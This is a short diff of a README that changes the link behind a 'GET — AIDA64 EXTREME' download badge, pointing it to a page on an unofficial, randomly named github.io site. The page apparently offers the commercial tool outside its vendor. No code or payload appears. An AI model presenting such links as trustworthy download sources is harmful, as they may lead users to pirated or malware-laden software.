@@ -4,7 +4,7 @@
 <img src="https://d2nwkt1g6n1fev.cloudfront.net/helpmax/wp-content/uploads/sub/aida64/en/source/splash.jpg" width="400">
 </p>
 
-[![GET — AIDA64 EXTREME](https://img.shields.io/badge/GET-AIDA64%20EXTREME-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/)
+[![GET — AIDA64 EXTREME](https://img.shields.io/badge/GET-AIDA64%20EXTREME-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/AIDA64-extreme)
 
 ---
 
